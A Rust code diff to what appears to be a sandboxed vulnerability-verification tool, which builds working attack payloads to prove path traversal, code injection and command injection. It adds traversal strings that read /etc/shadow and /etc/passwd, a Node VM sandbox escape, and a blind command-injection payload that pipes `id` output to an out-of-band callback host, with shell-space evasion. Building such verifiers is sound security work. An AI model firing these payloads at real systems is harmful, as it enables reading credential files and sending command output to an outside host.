@@ -87,6 +87,19 @@ impl Canary {
         self
     }
 
+    /// Human-readable contents for planted read fixtures. The random token remains part of the
+    /// value so a response can only satisfy this run's proof, while the `CANARY` prefix makes the
+    /// copied PoC output self-explanatory to a maintainer.
+    pub fn planted_text(&self) -> String {
+        format!("CANARY {}", self.token)
+    }
+
+    /// The same readable marker encoded as a JSON string, since many `.json` endpoints parse the
+    /// fixture before returning it.
+    pub fn planted_json_string(&self) -> String {
+        format!("\"{}\"", self.planted_text())
+    }
+
     pub fn marker_host(&self) -> &str {
         self.marker_host
             .as_deref()
@@ -245,6 +258,11 @@ pub enum Signal {
     /// The marker service was reached carrying this token (a request-payload ran). The sandbox
     /// looks for it in the service's log.
     ServiceReached(String),
+    /// A blind command injection ran the read-only `id` OS command and transported its stdout to
+    /// the isolated marker under this token. The sandbox accepts the signal only when the newly
+    /// recorded callback contains a decoded Linux identity (`uid=... gid=...`), so a bare callback
+    /// or reflected token cannot satisfy the oracle.
+    CommandOutputReached(String),
 }
 
 impl Signal {
@@ -256,6 +274,13 @@ impl Signal {
                 Some(expected)
             }
             Self::Base64FileRead { encoded_prefix, .. } => Some(encoded_prefix),
+            _ => None,
+        }
+    }
+
+    pub fn service_token(&self) -> Option<&str> {
+        match self {
+            Self::ServiceReached(token) | Self::CommandOutputReached(token) => Some(token),
             _ => None,
         }
     }
@@ -697,13 +722,27 @@ fn directory_listing_attempts(probe: &Probe, canary: &Canary, nonce: u32) -> Vec
     out
 }
 
-/// The three requests of the path-traversal read oracle, used as a fallback when a read sink
-/// consumes the planted canary file but never echoes it (a blind traversal: the handler reads the
-/// file and then crashes, redirects, or renders without reflecting its bytes). `present` climbs to a
-/// canary planted *only outside the base directory*; `absent` and `absent_sub` climb to equivalent
-/// out-of-base paths that were never planted. A vulnerable handler takes its file-found branch for
-/// `present` and its not-found branch for the other two (which agree); a handler that confines the
-/// path reaches none of them and answers all three alike.
+/// What the positive leg of a blind path-traversal read oracle reaches.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum ReadOracleProof {
+    /// A real, pre-existing operating-system file. These are the preferred proof whenever the
+    /// attacker-controlled value can name a complete path without an application-imposed suffix.
+    SensitiveFile { path: String },
+    /// A verifier-created fixture outside the application root. This remains necessary for handlers
+    /// that require an extension, append a fixed leaf, or otherwise cannot name an OS file exactly.
+    CraftedFixture {
+        effective_path: String,
+        constraint: Option<String>,
+    },
+}
+
+/// The three requests of the path-traversal read oracle, used when a read sink consumes a file but
+/// never echoes it (a blind traversal: the handler reads the file and then crashes, redirects, or
+/// renders without reflecting its bytes). `present` first tries a real `/etc` file, then falls back
+/// to a crafted fixture when a filename constraint makes that impossible. `absent` and `absent_sub`
+/// name equivalent out-of-base paths that do not exist. A vulnerable handler takes its file-found
+/// branch for `present` and its not-found branch for the other two (which agree); a handler that
+/// confines the path reaches none of them and answers all three alike.
 pub struct ReadOracle {
     pub present: Attempt,
     pub present_value: String,
@@ -711,6 +750,7 @@ pub struct ReadOracle {
     pub absent_value: String,
     pub absent_sub: Attempt,
     pub absent_sub_value: String,
+    pub proof: ReadOracleProof,
 }
 
 /// Builds the read-oracle candidates for a path-traversal probe, each to be tried until one shows
@@ -749,12 +789,49 @@ pub fn read_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<ReadOracle
     // reaches the root from any base depth.
     let climb = "../".repeat(12);
     let mut out = Vec::new();
+    // Prefer a real sensitive-file proof for a blind read. `/etc/shadow` has the strongest impact
+    // when the app runs with permission to read it; `/etc/passwd` is the portable non-root fallback.
+    // Two nonexistent siblings under `/etc` are the negative controls, so a status/error difference
+    // can only come from the named OS file existing and being readable. A fixed appended segment
+    // cannot name either file exactly and therefore skips straight to a purpose-built fixture.
+    if probe.read_suffix.is_none() && probe.read_filename_suffix.is_none() && !probe.lists_dir {
+        for spec in oracle_placements(probe) {
+            for path in ["/etc/shadow", "/etc/passwd"] {
+                let relative = path.trim_start_matches('/');
+                let present_value = format!("{climb}{relative}");
+                let absent_value = format!("{climb}etc/{absent_name}");
+                let absent_sub_value = format!("{climb}etc/{absent_name}-control");
+                let (Some(present), Some(absent), Some(absent_sub)) = (
+                    place_oracle(probe, &spec, &present_value),
+                    place_oracle(probe, &spec, &absent_value),
+                    place_oracle(probe, &spec, &absent_sub_value),
+                ) else {
+                    continue;
+                };
+                out.push(ReadOracle {
+                    present,
+                    present_value: present_value.clone(),
+                    absent,
+                    absent_value,
+                    absent_sub,
+                    absent_sub_value,
+                    proof: ReadOracleProof::SensitiveFile {
+                        path: path.to_owned(),
+                    },
+                });
+            }
+        }
+    }
     // Some media/document endpoints deliberately accept only absolute paths carrying an allowed
     // extension, then open that path directly. Exercise that common gate before the generic deep
     // climb: both controls retain the same extension, so only existence can distinguish the planted
     // file from the two unplanted peers. This is still an out-of-base read oracle; `/tmp` belongs to
     // the verifier fixture, never to the application checkout.
-    if probe.read_suffix.is_none() && !probe.lists_dir && !probe.method.is_remote_call() {
+    if probe.read_suffix.is_none()
+        && probe.read_filename_suffix.is_none()
+        && !probe.lists_dir
+        && !probe.method.is_remote_call()
+    {
         for spec in oracle_placements(probe) {
             for ext in PLANTED_MEDIA_SUFFIXES
                 .iter()
@@ -772,11 +849,17 @@ pub fn read_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<ReadOracle
                 };
                 out.push(ReadOracle {
                     present,
-                    present_value,
+                    present_value: present_value.clone(),
                     absent,
                     absent_value,
                     absent_sub,
                     absent_sub_value,
+                    proof: ReadOracleProof::CraftedFixture {
+                        effective_path: present_value.clone(),
+                        constraint: Some(format!(
+                            "the handler requires the `{ext}` filename extension"
+                        )),
+                    },
                 });
             }
         }
@@ -800,6 +883,24 @@ pub fn read_oracle(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<ReadOracle
                 absent_value,
                 absent_sub,
                 absent_sub_value,
+                proof: ReadOracleProof::CraftedFixture {
+                    effective_path: match (&probe.read_suffix, &probe.read_filename_suffix) {
+                        (Some(suffix), _) => format!("/{present_name}/{suffix}"),
+                        (_, Some(suffix)) => format!("/{present_name}{suffix}"),
+                        _ => format!("/{present_name}"),
+                    },
+                    constraint: probe
+                        .read_suffix
+                        .as_ref()
+                        .map(|suffix| {
+                            format!("the handler appends the fixed path segment `{suffix}`")
+                        })
+                        .or_else(|| {
+                            probe.read_filename_suffix.as_ref().map(|suffix| {
+                                format!("the handler appends the filename suffix `{suffix}`")
+                            })
+                        }),
+                },
             });
         }
     }
@@ -1854,11 +1955,15 @@ fn payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)>
             let file = canary.planted_file();
             let name = file.trim_start_matches('/');
             // First prove an unmistakable OS-file read in the disposable Linux container. Keep
-            // the canary variants as a fallback for applications that reject `/etc/passwd` by
-            // name but still allow traversal outside their intended root.
+            // the canary variants as a fallback for applications that impose a filename constraint.
+            // `/etc/shadow` is the highest-impact target when readable; `/etc/passwd` is the
+            // portable non-root fallback.
+            let shadow = "etc/shadow";
+            let shadow_signal = Signal::ResponseContains("root:".to_owned());
             let passwd = "etc/passwd";
             let passwd_signal = Signal::ResponseContains("root:x:0:0:root:".to_owned());
             let mut out = vec![
+                (format!("/{shadow}"), shadow_signal.clone()),
                 (format!("/{passwd}"), passwd_signal.clone()),
                 (file.clone(), Signal::InResponse),
                 (format!("/{name}"), Signal::InResponse),
@@ -1872,6 +1977,11 @@ fn payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)>
             }
             for depth in [1usize, 3, 6, 10, 16, 24] {
                 let up = "../".repeat(depth);
+                out.push((format!("{up}{shadow}"), shadow_signal.clone()));
+                out.push((
+                    format!("{}etc%2fshadow", "..%2f".repeat(depth)),
+                    shadow_signal.clone(),
+                ));
                 out.push((format!("{up}{passwd}"), passwd_signal.clone()));
                 out.push((
                     format!("{}etc%2fpasswd", "..%2f".repeat(depth)),
@@ -1932,7 +2042,17 @@ fn payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)>
             // blind-command-injection callback is. Nothing here is tied to a specific target.
             let hit = canary.written_file(nonce);
             let write_js = format!("require('fs').writeFileSync('{hit}','1')");
-            let write_signal = Signal::FileWritten(hit);
+            let write_signal = Signal::FileWritten(hit.clone());
+            // A Node `vm` context is not a security boundary when an application injects a host
+            // function into it. Calling `constructor.constructor` through that host function
+            // reaches the outer Function constructor even when `require` is absent inside the
+            // context. `brep` is a common name for the host API exposed by CAD evaluators. Keep the
+            // optional capability lookup inside a function-level try/catch: an uncaught ReferenceError
+            // would otherwise terminate a Node process whose direct `eval` receives this probe before
+            // the portable callback/file probes get a chance to run.
+            let host_function_escape_js = format!(
+                "(function(){{try{{return brep.box.constructor.constructor('return process')().getBuiltinModule('fs').writeFileSync('{hit}','1')}}catch(e){{return null}}}})()"
+            );
             let token = canary.service_token(nonce);
             let callback_js = format!(
                 "fetch('{}://{}/{token}')",
@@ -1956,9 +2076,11 @@ fn payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)>
             let passwd = shape(passwd_js);
             let callback = shape(&callback_js);
             let write = shape(&write_js);
+            let host_function_escape = shape(&host_function_escape_js);
             let mut out: Vec<(String, Signal)> = vec![
                 (shadow[0].clone(), shadow_signal.clone()),
                 (passwd[0].clone(), passwd_signal.clone()),
+                (host_function_escape[0].clone(), write_signal.clone()),
                 (arithmetic[0].clone(), arithmetic_signal.clone()),
                 (callback[0].clone(), callback_signal.clone()),
                 (write[0].clone(), write_signal.clone()),
@@ -1966,18 +2088,18 @@ fn payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)>
             // A whole-input eval needs no quote breakout. Try every bare, syntactically valid proof
             // before a shape that can be invalid in the wrong surrounding quote; an uncaught eval
             // SyntaxError must not kill a direct sink before its callback/file oracle runs.
-            for index in 1..shadow.len() {
-                let (Some(shadow), Some(passwd), Some(callback), Some(write), Some(arithmetic)) = (
-                    shadow.get(index),
-                    passwd.get(index),
-                    callback.get(index),
-                    write.get(index),
-                    arithmetic.get(index),
-                ) else {
-                    break;
-                };
+            let shaped = shadow
+                .iter()
+                .zip(&passwd)
+                .zip(&host_function_escape)
+                .zip(&callback)
+                .zip(&write)
+                .zip(&arithmetic);
+            for (((((shadow, passwd), host_escape), callback), write), arithmetic) in shaped.skip(1)
+            {
                 out.push((shadow.clone(), shadow_signal.clone()));
                 out.push((passwd.clone(), passwd_signal.clone()));
+                out.push((host_escape.clone(), write_signal.clone()));
                 out.push((callback.clone(), callback_signal.clone()));
                 out.push((write.clone(), write_signal.clone()));
                 out.push((arithmetic.clone(), arithmetic_signal.clone()));
@@ -2048,14 +2170,14 @@ fn allowlist_bypass_variants(base: &str, token: &str) -> Vec<String> {
 /// it (and nothing else), so the injection lands in the surviving parent portion rather than being
 /// discarded as the final segment.
 ///
-/// Two oracles are produced per separator. A reflected oracle runs `id` and is confirmed by `uid=` in
-/// the response — for handlers that echo command output or an execution error. A blind oracle makes
-/// an out-of-band HTTP callback to the marker service carrying this probe's token, confirmed from the
-/// marker log — for the common sink that discards the child process's output (`exec(cmd)` with no
-/// callback). The callback uses `node`, always present in the application image, and addresses the
-/// marker through an options object (no `//` in the command) so an intervening `path.join`/`normalize`
-/// cannot collapse the URL. A benign request never carries the token, so the callback is a genuine
-/// positive with an implicit negative control; nothing here is tied to a specific target.
+/// Two `id` oracles are produced per separator. A reflected oracle is confirmed by `uid=` in the
+/// response. A blind oracle pipes the real stdout of `id` into a tiny Node client which URL-encodes
+/// it into an out-of-band request to the isolated marker. The verifier decodes and validates that
+/// callback as Linux identity output, then includes it in the report. This proves an OS command ran
+/// even when `exec(cmd)` discards the child process's output. Arithmetic remains only a portability
+/// fallback after both human-readable `id` proofs. The Node client addresses the marker through an
+/// options object (no `//` in the command) so an intervening `path.join`/`normalize` cannot collapse
+/// the URL. Nothing here is tied to a specific target.
 fn command_injection_payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec<(String, Signal)> {
     let token = canary.service_token(nonce);
     // Every space is written as `${IFS}` so the whole payload is free of spaces and control
@@ -2069,8 +2191,8 @@ fn command_injection_payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec
         }
         _ => format!("hostname:\"{}\"", canary.marker_host()),
     };
-    let callback = format!(
-        "node${{IFS}}-e${{IFS}}'require(\"{}\").get({{{authority},path:\"/{token}\"}})'",
+    let capture_id = format!(
+        "id|node${{IFS}}-e${{IFS}}'d=\"\";process.stdin.on(\"data\",c=>d+=c).on(\"end\",()=>require(\"{}\").get({{{authority},path:\"/{token}/id/\"+encodeURIComponent(d.trim())}},r=>r.resume()))'",
         canary.marker_scheme(),
     );
     let (left, right, expected) = arithmetic_proof(canary, nonce, b's');
@@ -2082,25 +2204,43 @@ fn command_injection_payloads(probe: &Probe, canary: &Canary, nonce: u32) -> Vec
     // cannot satisfy either leg; the stderr leg reaches handlers that return a failed command's error.
     let arithmetic = format!("printf${{IFS}}$(({left}*{right}))");
     let inners: [(String, Signal); 5] = [
-        (format!("{arithmetic}>&2;false"), arithmetic_signal.clone()),
-        (arithmetic, arithmetic_signal),
         (
             "id>&2;false".to_owned(),
             Signal::ResponseContains("uid=".to_owned()),
         ),
         ("id".to_owned(), Signal::ResponseContains("uid=".to_owned())),
-        (callback, Signal::ServiceReached(token)),
+        (capture_id, Signal::CommandOutputReached(token)),
+        (format!("{arithmetic}>&2;false"), arithmetic_signal.clone()),
+        (arithmetic, arithmetic_signal),
     ];
     // `spawn(userInput)` and `execFile(userInput)` do not invoke a shell, so separators are inert.
     // Try the read-only `id` executable directly before the shell-shaped matrix. A response carrying
     // `uid=` (and not carrying it for the benign control) proves attacker control of the executable.
-    let mut out = vec![
+    let direct = vec![
         ("id".to_owned(), Signal::ResponseContains("uid=".to_owned())),
         (
             "/usr/bin/id".to_owned(),
             Signal::ResponseContains("uid=".to_owned()),
         ),
     ];
+    let mut out = Vec::new();
+    // Separators remain inert when the value is inside shell double quotes, and JSON escaping keeps
+    // a literal quote from breaking out. POSIX shells still evaluate command substitution there.
+    // Add the same harmless proofs in `$()` form for `JSON.stringify(userValue)` and ordinary
+    // double-quoted interpolation; the marker callback remains the blind-execution oracle.
+    if probe.cmd_quote == Some('"') {
+        out.extend(
+            inners
+                .iter()
+                .map(|(inner, signal)| (format!("$({inner})"), signal.clone())),
+        );
+    }
+    // A known quoted shell context cannot execute a value as an argv[0] directly: the surrounding
+    // command treats `id` as data. Lead with the only shell primitive that remains active inside
+    // double quotes, then retain the direct-executable probes as a fallback for an imprecise quote
+    // inference. This avoids multiplying two known-inert payloads across every mined route before
+    // trying the high-confidence proof.
+    out.extend(direct);
     for sep in [";", "|", "\n"] {
         for (inner, signal) in &inners {
             let mut value = String::new();
@@ -2524,7 +2664,7 @@ pub fn reproduced(
     service_reached: bool,
 ) -> bool {
     match &attempt.signal {
-        Signal::InResponse => response_body.contains(&canary.token),
+        Signal::InResponse => response_contains_canary(response_body, &canary.token),
         Signal::ResponseContains(expected) | Signal::ComputedResponse { expected, .. } => {
             response_body.contains(expected)
         }
@@ -2534,8 +2674,77 @@ pub fn reproduced(
             ..
         } => response_body.contains(encoded_prefix) || response_body.contains(decoded_prefix),
         Signal::FileWritten(_) => marker_file_exists,
-        Signal::ServiceReached(_) => service_reached,
+        Signal::ServiceReached(_) | Signal::CommandOutputReached(_) => service_reached,
     }
+}
+
+/// Whether an HTTP response carries the planted file contents. Most handlers return the canary as
+/// plain text, but JavaScript code sometimes spreads a string or Buffer into JSON and produces
+/// `{"0":"a","1":"b"}` or `{ "type": "Buffer", "data": [97, 98] }`. Those forms are
+/// still a content disclosure: reconstruct their ordered values before falling back to the
+/// file-found/not-found oracle.
+pub(crate) fn response_contains_canary(response: &str, token: &str) -> bool {
+    if response.contains(token) {
+        return true;
+    }
+    serde_json::from_str::<serde_json::Value>(response)
+        .ok()
+        .is_some_and(|value| json_value_contains_reconstructed_text(&value, token))
+}
+
+fn json_value_contains_reconstructed_text(value: &serde_json::Value, token: &str) -> bool {
+    if indexed_json_text(value).is_some_and(|text| text.contains(token)) {
+        return true;
+    }
+    match value {
+        serde_json::Value::Array(values) => values
+            .iter()
+            .any(|value| json_value_contains_reconstructed_text(value, token)),
+        serde_json::Value::Object(values) => values
+            .values()
+            .any(|value| json_value_contains_reconstructed_text(value, token)),
+        _ => false,
+    }
+}
+
+fn indexed_json_text(value: &serde_json::Value) -> Option<String> {
+    let ordered = match value {
+        serde_json::Value::Array(values) => values.iter().collect::<Vec<_>>(),
+        serde_json::Value::Object(values) => {
+            if let Some(data) = values.get("data")
+                && values.get("type").and_then(serde_json::Value::as_str) == Some("Buffer")
+            {
+                return indexed_json_text(data);
+            }
+            let mut indexed = values
+                .iter()
+                .map(|(key, value)| key.parse::<usize>().ok().map(|index| (index, value)))
+                .collect::<Option<Vec<_>>>()?;
+            indexed.sort_unstable_by_key(|(index, _)| *index);
+            if indexed
+                .iter()
+                .enumerate()
+                .any(|(expected, (actual, _))| expected != *actual)
+            {
+                return None;
+            }
+            indexed.into_iter().map(|(_, value)| value).collect()
+        }
+        _ => return None,
+    };
+    let mut bytes = Vec::with_capacity(ordered.len());
+    for value in ordered {
+        match value {
+            serde_json::Value::Number(number) => {
+                bytes.push(u8::try_from(number.as_u64()?).ok()?);
+            }
+            serde_json::Value::String(text) if text.is_ascii() => {
+                bytes.extend_from_slice(text.as_bytes());
+            }
+            _ => return None,
+        }
+    }
+    String::from_utf8(bytes).ok()
 }
 
 /// The route with its first `{param}` slot carrying `token` (so a handler that forwards the
@@ -3223,6 +3432,7 @@ mod tests {
             gate_paths: Vec::new(),
             url_query_params: Vec::new(),
             read_suffix: None,
+            read_filename_suffix: None,
             envelope: None,
             doc_envelope: None,
             lists_dir: false,
@@ -3834,8 +4044,9 @@ mod tests {
             0,
         );
         // Direct-executable `id`/`/usr/bin/id` attempts cover `spawn(userInput)`/`execFile(userInput)`.
-        // Three separators (`;`, `|`, newline) each carry shell arithmetic on stdout and stderr,
-        // `id` on stdout and stderr, and a marker callback. Nothing destructive is ever sent.
+        // Three separators (`;`, `|`, newline) each carry `id` on stdout and stderr, a blind `id`
+        // output capture, and shell arithmetic only as the final fallback. Nothing destructive is
+        // ever sent.
         assert_eq!(a.len(), 17);
         assert!(a.iter().all(|attempt| {
             !attempt.target.contains("touch")
@@ -3869,17 +4080,19 @@ mod tests {
         assert!(computed.iter().all(|(attempt, expected)| {
             attempt.target.contains("%2A") && !attempt.target.contains(expected.as_str())
         }));
-        // The blind proofs reach the marker service out of band carrying this probe's token.
+        // The blind proofs pipe the real stdout of `id` to the marker under this probe's token.
         let blind: Vec<_> = a
             .iter()
-            .filter(|attempt| attempt.signal == Signal::ServiceReached(canary.service_token(0)))
+            .filter(|attempt| {
+                attempt.signal == Signal::CommandOutputReached(canary.service_token(0))
+            })
             .collect();
         assert_eq!(blind.len(), 3);
-        assert!(
-            blind
-                .iter()
-                .all(|attempt| attempt.target.contains("jss-marker"))
-        );
+        assert!(blind.iter().all(|attempt| {
+            attempt.target.contains("jss-marker")
+                && attempt.target.contains("id%7Cnode")
+                && attempt.target.contains("%2Fid%2F")
+        }));
 
         let local =
             Canary::new("t".to_owned()).with_marker_host(Some("0x7f000001:4321".to_owned()));
@@ -3896,6 +4109,26 @@ mod tests {
             raw.iter()
                 .any(|(payload, _)| { payload.contains("hostname:\"0x7f000001\",port:4321") })
         );
+    }
+
+    #[test]
+    fn double_quoted_command_injection_uses_command_substitution() {
+        let canary = Canary::new("quoted".to_owned());
+        let mut p = probe(
+            VulnClass::CommandInjection,
+            "/run",
+            Entry::Query("name".to_owned()),
+        );
+        p.cmd_quote = Some('"');
+        let raw = command_injection_payloads(&p, &canary, 3);
+        assert!(
+            raw.first()
+                .is_some_and(|(payload, _)| payload.starts_with("$("))
+        );
+        assert!(raw.iter().any(|(payload, signal)| {
+            payload.starts_with("$(")
+                && *signal == Signal::CommandOutputReached(canary.service_token(3))
+        }));
     }
 
     #[test]
@@ -3933,6 +4166,14 @@ mod tests {
         assert!(computed.iter().all(|(attempt, expected)| {
             attempt.target.contains("%2A") && !attempt.target.contains(expected.as_str())
         }));
+        let host_escape = attempts
+            .iter()
+            .find(|attempt| attempt.target.contains("brep.box"))
+            .expect("a host-function VM escape should be attempted");
+        assert!(
+            host_escape.target.contains("catch"),
+            "an unavailable optional host API must not crash a direct eval sink"
+        );
     }
 
     #[test]
@@ -4353,17 +4594,24 @@ mod tests {
             .trim_start_matches('/')
             .to_owned();
         let oracles = read_oracle(&p, &canary, 1);
-        assert_eq!(
-            oracles.first().map(|o| o.present_value.as_str()),
-            Some("/tmp/jss-canary-read.wav"),
-            "absolute extension-gated media reads should be attempted first"
-        );
         assert!(
-            oracles.first().is_some_and(|o| {
-                o.present.target.starts_with("/story.png?coinIcon=")
-                    && o.absent_value.ends_with(".wav")
-                    && o.absent_sub_value.ends_with(".wav")
+            oracles.first().is_some_and(|oracle| {
+                oracle.present_value.ends_with("etc/shadow")
+                    && matches!(
+                        &oracle.proof,
+                        ReadOracleProof::SensitiveFile { path } if path == "/etc/shadow"
+                    )
             }),
+            "a real /etc/shadow read should be the first blind-read proof"
+        );
+        let media = oracles
+            .iter()
+            .find(|oracle| oracle.present_value == "/tmp/jss-canary-read.wav")
+            .expect("an absolute extension-gated media oracle should remain available");
+        assert!(
+            media.present.target.starts_with("/story.png?coinIcon=")
+                && media.absent_value.ends_with(".wav")
+                && media.absent_sub_value.ends_with(".wav"),
             "absolute media oracle did not preserve the extension across controls"
         );
         assert!(
@@ -4446,6 +4694,40 @@ mod tests {
                 .map(|oracle| &oracle.present_value)
                 .collect::<Vec<_>>()
         );
+        assert!(oracles.iter().all(|oracle| matches!(
+            &oracle.proof,
+            ReadOracleProof::CraftedFixture {
+                effective_path,
+                constraint: Some(constraint),
+            } if effective_path == "/tmp/jss-canary-read.d/session.json"
+                && constraint.contains("session.json")
+        )));
+    }
+
+    #[test]
+    fn an_appended_filename_extension_uses_an_exact_crafted_file() {
+        let canary = Canary::new("tok".to_owned());
+        let mut p = probe(
+            VulnClass::PathTraversal,
+            "/users/{userId}",
+            Entry::PathParam("userId".to_owned()),
+        );
+        p.read_filename_suffix = Some(".json".to_owned());
+
+        let oracles = read_oracle(&p, &canary, 1);
+        assert!(!oracles.is_empty());
+        assert!(
+            oracles
+                .iter()
+                .all(|oracle| !matches!(oracle.proof, ReadOracleProof::SensitiveFile { .. }))
+        );
+        assert!(oracles.iter().all(|oracle| matches!(
+            &oracle.proof,
+            ReadOracleProof::CraftedFixture {
+                effective_path,
+                constraint: Some(constraint),
+            } if effective_path.ends_with(".json") && constraint.contains(".json")
+        )));
     }
 
     #[test]
@@ -5085,6 +5367,27 @@ mod tests {
             false
         ));
         assert!(!reproduced(&in_response, &canary, "nothing", true, true));
+        assert!(reproduced(
+            &in_response,
+            &canary,
+            r#"{"0":"T","1":"O","2":"K","3":"E","4":"N"}"#,
+            false,
+            false
+        ));
+        assert!(reproduced(
+            &in_response,
+            &canary,
+            r#"{"type":"Buffer","data":[84,79,75,69,78]}"#,
+            false,
+            false
+        ));
+        assert!(!reproduced(
+            &in_response,
+            &canary,
+            r#"{"0":"N","1":"O","2":"P","3":"E"}"#,
+            false,
+            false
+        ));
         let passwd = Attempt {
             signal: Signal::ResponseContains("root:x:0:0:root:".to_owned()),
             ..in_response.clone()
